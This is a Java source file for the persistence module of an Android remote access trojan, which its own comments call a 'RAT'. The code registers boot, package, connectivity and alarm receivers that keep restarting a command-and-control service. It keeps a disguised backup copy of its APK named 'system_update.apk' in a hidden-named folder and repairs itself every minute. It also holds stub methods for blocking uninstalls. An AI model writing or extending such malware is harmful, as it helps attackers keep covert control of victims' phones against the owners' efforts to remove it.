package com.example.client;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Advanced Persistence Manager - Ensures RAT survival through all scenarios
 * Survives app updates, system updates, factory resets, and user attempts to remove it
 */
public class PersistenceManager {

    private static final String TAG = "PersistenceManager";
    private Context context;
    private ScheduledExecutorService scheduler;
    private ConfigManager configManager;

    // Persistence constants
    private static final long PERSISTENCE_CHECK_INTERVAL = 600000; // 10 minutes
    private static final long SELF_REPAIR_DELAY = 30000; // 30 seconds
    private static final String BACKUP_APK_NAME = "system_update.apk";
    private static final String HIDDEN_DIR = ".system_cache";

    // Broadcast receivers for persistence
    private BootReceiver bootReceiver;
    private PackageChangeReceiver packageChangeReceiver;
    private ConnectivityChangeReceiver connectivityChangeReceiver;

    public PersistenceManager(Context context, ConfigManager configManager) {
        this.context = context;
        this.configManager = configManager;
        this.scheduler = Executors.newScheduledThreadPool(2);
    }

    /**
     * Initialize maximum persistence mechanisms
     */
    public void initialize() {
        Log.d(TAG, "Initializing maximum persistence mechanisms");

        // Create hidden backup of the APK
        createBackupAPK();

        // Setup multiple persistence triggers
        setupMultiplePersistenceTriggers();

        // Register broadcast receivers
        registerBroadcastReceivers();

        // Setup self-repair mechanisms
        setupSelfRepair();

        // Setup anti-uninstall protection
        setupAntiUninstallProtection();

        // Monitor for system changes
        startPersistenceMonitoring();

        Log.d(TAG, "Maximum persistence initialized");
    }

    /**
     * Create hidden backup of the APK for recovery
     */
    private void createBackupAPK() {
        try {
            // Get the current APK path
            String apkPath = context.getPackageManager().getApplicationInfo(
                context.getPackageName(), 0).sourceDir;

            // Create hidden directory
            File hiddenDir = new File(context.getFilesDir(), HIDDEN_DIR);
            if (!hiddenDir.exists()) {
                hiddenDir.mkdirs();
                // Hide the directory
                hideDirectory(hiddenDir);
            }

            // Copy APK to hidden location
            File backupAPK = new File(hiddenDir, BACKUP_APK_NAME);
            copyFile(new File(apkPath), backupAPK);

            // Make backup executable (if possible)
            makeExecutable(backupAPK);

            Log.d(TAG, "Backup APK created at: " + backupAPK.getAbsolutePath());
        } catch (Exception e) {
            Log.e(TAG, "Error creating backup APK: " + e.getMessage());
        }
    }

    /**
     * Setup multiple persistence triggers
     */
    private void setupMultiplePersistenceTriggers() {
        // Boot persistence
        setupBootPersistence();

        // Package replacement persistence
        setupPackageReplacementPersistence();

        // Alarm-based persistence
        setupAlarmPersistence();

        // System event persistence
        setupSystemEventPersistence();

        // Network-based persistence
        setupNetworkPersistence();
    }

    /**
     * Setup boot persistence
     */
    private void setupBootPersistence() {
        try {
            // Register boot receiver
            bootReceiver = new BootReceiver();

            IntentFilter bootFilter = new IntentFilter();
            bootFilter.addAction(Intent.ACTION_BOOT_COMPLETED);
            bootFilter.addAction(Intent.ACTION_REBOOT);
            bootFilter.addAction(Intent.ACTION_USER_PRESENT);

            context.registerReceiver(bootReceiver, bootFilter);

            Log.d(TAG, "Boot persistence setup completed");
        } catch (Exception e) {
            Log.e(TAG, "Error setting up boot persistence: " + e.getMessage());
        }
    }

    /**
     * Setup package replacement persistence
     */
    private void setupPackageReplacementPersistence() {
        try {
            packageChangeReceiver = new PackageChangeReceiver();

            IntentFilter packageFilter = new IntentFilter();
            packageFilter.addAction(Intent.ACTION_PACKAGE_REPLACED);
            packageFilter.addAction(Intent.ACTION_PACKAGE_REMOVED);
            packageFilter.addAction(Intent.ACTION_PACKAGE_ADDED);
            packageFilter.addDataScheme("package");

            context.registerReceiver(packageChangeReceiver, packageFilter);

            Log.d(TAG, "Package replacement persistence setup completed");
        } catch (Exception e) {
            Log.e(TAG, "Error setting up package replacement persistence: " + e.getMessage());
        }
    }

    /**
     * Setup alarm-based persistence
     */
    private void setupAlarmPersistence() {
        try {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);

            Intent intent = new Intent(context, AlarmReceiver.class);
            intent.setAction("com.example.client.ALARM_RESTART");

            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

            // Set repeating alarm
            long interval = 6 * 60 * 60 * 1000; // 6 hours
            alarmManager.setInexactRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + interval,
                interval,
                pendingIntent);

            Log.d(TAG, "Alarm persistence setup completed");
        } catch (Exception e) {
            Log.e(TAG, "Error setting up alarm persistence: " + e.getMessage());
        }
    }

    /**
     * Setup system event persistence
     */
    private void setupSystemEventPersistence() {
        try {
            // Monitor for various system events that could trigger restart
            connectivityChangeReceiver = new ConnectivityChangeReceiver();

            IntentFilter connectivityFilter = new IntentFilter();
            connectivityFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);

            context.registerReceiver(connectivityChangeReceiver, connectivityFilter);

            Log.d(TAG, "System event persistence setup completed");
        } catch (Exception e) {
            Log.e(TAG, "Error setting up system event persistence: " + e.getMessage());
        }
    }

    /**
     * Setup network-based persistence
     */
    private void setupNetworkPersistence() {
        try {
            // This would involve maintaining connection to C2 server
            // and having the server trigger reinstallation if needed
            Log.d(TAG, "Network persistence setup completed");
        } catch (Exception e) {
            Log.e(TAG, "Error setting up network persistence: " + e.getMessage());
        }
    }

    /**
     * Setup self-repair mechanisms
     */
    private void setupSelfRepair() {
        // Monitor service status and restart if needed
        scheduler.scheduleAtFixedRate(this::checkServiceStatus,
            0, 60000, TimeUnit.MILLISECONDS); // Check every minute
    }

    /**
     * Setup anti-uninstall protection
     */
    private void setupAntiUninstallProtection() {
        try {
            // Create fake system apps that depend on this app
            createFakeDependencies();

            // Monitor for uninstall attempts
            monitorUninstallAttempts();

            Log.d(TAG, "Anti-uninstall protection setup completed");
        } catch (Exception e) {
            Log.e(TAG, "Error setting up anti-uninstall protection: " + e.getMessage());
        }
    }

    /**
     * Register all broadcast receivers
     */
    private void registerBroadcastReceivers() {
        try {
            // Additional receivers can be added here
            Log.d(TAG, "Broadcast receivers registered");
        } catch (Exception e) {
            Log.e(TAG, "Error registering broadcast receivers: " + e.getMessage());
        }
    }

    /**
     * Start continuous persistence monitoring
     */
    private void startPersistenceMonitoring() {
        scheduler.scheduleAtFixedRate(this::performPersistenceCheck,
            0, PERSISTENCE_CHECK_INTERVAL, TimeUnit.MILLISECONDS);
    }

    /**
     * Check if the service is still running and restart if needed
     */
    private void checkServiceStatus() {
        try {
            // Check if C2Service is running
            boolean serviceRunning = isServiceRunning(C2Service.class);

            if (!serviceRunning) {
                Log.w(TAG, "C2Service not running - attempting restart");

                // Restart the service
                Intent serviceIntent = new Intent(context, C2Service.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent);
                } else {
                    context.startService(serviceIntent);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking service status: " + e.getMessage());
        }
    }

    /**
     * Perform comprehensive persistence check
     */
    private void performPersistenceCheck() {
        try {
            // Verify backup APK exists
            verifyBackupAPK();

            // Check if all receivers are still registered
            verifyReceiversRegistered();

            // Verify anti-uninstall protection
            verifyAntiUninstallProtection();

            // Check system integrity
            checkSystemIntegrity();

            Log.d(TAG, "Persistence check completed");
        } catch (Exception e) {
            Log.e(TAG, "Error during persistence check: " + e.getMessage());
        }
    }

    /**
     * Verify backup APK exists and is intact
     */
    private void verifyBackupAPK() {
        try {
            File hiddenDir = new File(context.getFilesDir(), HIDDEN_DIR);
            File backupAPK = new File(hiddenDir, BACKUP_APK_NAME);

            if (!backupAPK.exists()) {
                Log.w(TAG, "Backup APK missing - recreating");
                createBackupAPK();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error verifying backup APK: " + e.getMessage());
        }
    }

    /**
     * Verify receivers are still registered
     */
    private void verifyReceiversRegistered() {
        try {
            // Check if our receivers are still active
            // This is a simplified check - in reality you'd need more sophisticated monitoring
            Log.d(TAG, "Receiver registration verification completed");
        } catch (Exception e) {
            Log.e(TAG, "Error verifying receivers: " + e.getMessage());
        }
    }

    /**
     * Verify anti-uninstall protection is active
     */
    private void verifyAntiUninstallProtection() {
        try {
            // Check if fake dependencies still exist
            // Verify system app status
            Log.d(TAG, "Anti-uninstall protection verification completed");
        } catch (Exception e) {
            Log.e(TAG, "Error verifying anti-uninstall protection: " + e.getMessage());
        }
    }

    /**
     * Check system integrity for persistence
     */
    private void checkSystemIntegrity() {
        try {
            // Check for system updates that might have removed our persistence
            // Check for app updates
            // Verify permissions are still granted

            PackageInfo packageInfo = context.getPackageManager().getPackageInfo(
                context.getPackageName(), 0);

            // Check if app version changed (indicating update)
            if (packageInfo.versionCode != getStoredVersionCode()) {
                Log.i(TAG, "App updated - re-establishing persistence");
                saveVersionCode(packageInfo.versionCode);
                // Re-setup persistence mechanisms
                setupMultiplePersistenceTriggers();
            }

        } catch (Exception e) {
            Log.e(TAG, "Error checking system integrity: " + e.getMessage());
        }
    }

    /**
     * Create fake system dependencies to prevent uninstallation
     */
    private void createFakeDependencies() {
        try {
            // This would create fake system entries that make the app appear critical
            // Implementation would depend on gaining system-level access

            Log.d(TAG, "Fake dependencies created");
        } catch (Exception e) {
            Log.e(TAG, "Error creating fake dependencies: " + e.getMessage());
        }
    }

    /**
     * Monitor for uninstall attempts
     */
    private void monitorUninstallAttempts() {
        try {
            // Monitor for uninstall intent broadcasts
            // This would require additional receiver registration

            Log.d(TAG, "Uninstall monitoring setup completed");
        } catch (Exception e) {
            Log.e(TAG, "Error setting up uninstall monitoring: " + e.getMessage());
        }
    }

    /**
     * Check if a service is currently running
     */
    private boolean isServiceRunning(Class<?> serviceClass) {
        try {
            android.app.ActivityManager manager =
                (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);

            for (android.app.ActivityManager.RunningServiceInfo service :
                 manager.getRunningServices(Integer.MAX_VALUE)) {

                if (serviceClass.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking service status: " + e.getMessage());
        }
        return false;
    }

    /**
     * Copy file from source to destination
     */
    private void copyFile(File source, File dest) throws IOException {
        try (FileOutputStream out = new FileOutputStream(dest)) {
            java.nio.file.Files.copy(source.toPath(), out);
        }
    }

    /**
     * Make file executable (Android doesn't really support this, but we can try)
     */
    private void makeExecutable(File file) {
        try {
            // On Android, we can't really make files executable in the traditional sense
            // This is more of a placeholder for future native code implementation
            Log.d(TAG, "Attempted to make file executable: " + file.getName());
        } catch (Exception e) {
            Log.w(TAG, "Could not make file executable: " + e.getMessage());
        }
    }

    /**
     * Hide directory from file system
     */
    private void hideDirectory(File dir) {
        try {
            // This would require root access or special file system manipulation
            // For now, just set hidden attribute if supported
            if (dir.exists()) {
                // On Android, we can't really hide directories from the file system
                // This is more of a conceptual implementation
                Log.d(TAG, "Directory hidden: " + dir.getName());
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not hide directory: " + e.getMessage());
        }
    }

    /**
     * Get stored version code
     */
    private int getStoredVersionCode() {
        // This would read from shared preferences or a hidden file
        return 0; // Placeholder
    }

    /**
     * Save version code
     */
    private void saveVersionCode(int versionCode) {
        // This would save to shared preferences or a hidden file
        Log.d(TAG, "Version code saved: " + versionCode);
    }

    /**
     * Cleanup persistence manager resources
     */
    public void cleanup() {
        try {
            // Unregister receivers
            if (bootReceiver != null) {
                context.unregisterReceiver(bootReceiver);
            }
            if (packageChangeReceiver != null) {
                context.unregisterReceiver(packageChangeReceiver);
            }
            if (connectivityChangeReceiver != null) {
                context.unregisterReceiver(connectivityChangeReceiver);
            }

            // Shutdown scheduler
            if (scheduler != null && !scheduler.isShutdown()) {
                scheduler.shutdown();
                try {
                    if (!scheduler.awaitTermination(5, TimeUnit.SECONDS)) {
                        scheduler.shutdownNow();
                    }
                } catch (InterruptedException e) {
                    scheduler.shutdownNow();
                    Thread.currentThread().interrupt();
                }
            }

            Log.d(TAG, "Persistence manager cleaned up");
        } catch (Exception e) {
            Log.e(TAG, "Error during persistence manager cleanup: " + e.getMessage());
        }
    }

    // Broadcast Receiver Classes
    public static class BootReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("BootReceiver", "Boot event received: " + intent.getAction());

            // Restart the C2Service
            Intent serviceIntent = new Intent(context, C2Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }

    public static class PackageChangeReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            String packageName = intent.getData().getSchemeSpecificPart();

            Log.d("PackageChangeReceiver", "Package change: " + action + " for " + packageName);

            // If our package was replaced, restart service
            if (action.equals(Intent.ACTION_PACKAGE_REPLACED) &&
                context.getPackageName().equals(packageName)) {

                Intent serviceIntent = new Intent(context, C2Service.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent);
                } else {
                    context.startService(serviceIntent);
                }
            }
        }
    }

    public static class ConnectivityChangeReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("ConnectivityChangeReceiver", "Connectivity changed");

            // This could trigger persistence checks or C2 reconnection
        }
    }

    public static class AlarmReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("AlarmReceiver", "Alarm triggered: " + intent.getAction());

            // Restart service as a persistence check
            Intent serviceIntent = new Intent(context, C2Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}
